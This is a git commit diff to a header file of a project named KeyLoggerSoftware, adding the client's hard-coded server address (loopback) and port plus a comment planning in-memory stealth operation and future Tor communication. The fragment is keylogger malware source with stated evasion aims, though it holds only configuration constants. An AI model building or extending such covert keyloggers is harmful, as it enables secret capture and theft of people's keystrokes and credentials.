2afc2832e282b3b13d11101b9427ef9b22453440
Qu3b411 <19296119+Qu3b411@users.noreply.github.com>
2018-12-09 18:00:22 -0800

    update support file for client
    established on loopback address by default

--- KeyLoggerSoftware/KeyLogger_clientCom.h
+++ KeyLoggerSoftware/KeyLogger_clientCom.h
@@ -1,5 +1,20 @@
 #ifndef KEYLOGGER_CLIENTCOM_H_INCLUDED
 #define KEYLOGGER_CLIENTCOM_H_INCLUDED
+/*
+    define all structures necessary for the server connection,
+    ip address, port, etc. i chose to hard code this information as a
+    contrast to the alternative of doing a config file,
+    eventually this software should live only in memory, this will enable
+    further stealth options,
+
+    the ip address should be configured by the server during compile time,
+    a script will eventually be included to configure the server via a compile
+    script.
+
+    NOTE: future updates will likly include communication over the tor v.3 network
+*/
+#define IP_ADDRESS "127.0.0.1"
+#define SERVER_CONNECTION_PORT 8080
 
 /*
     this is the max length in bytes to send at a time,
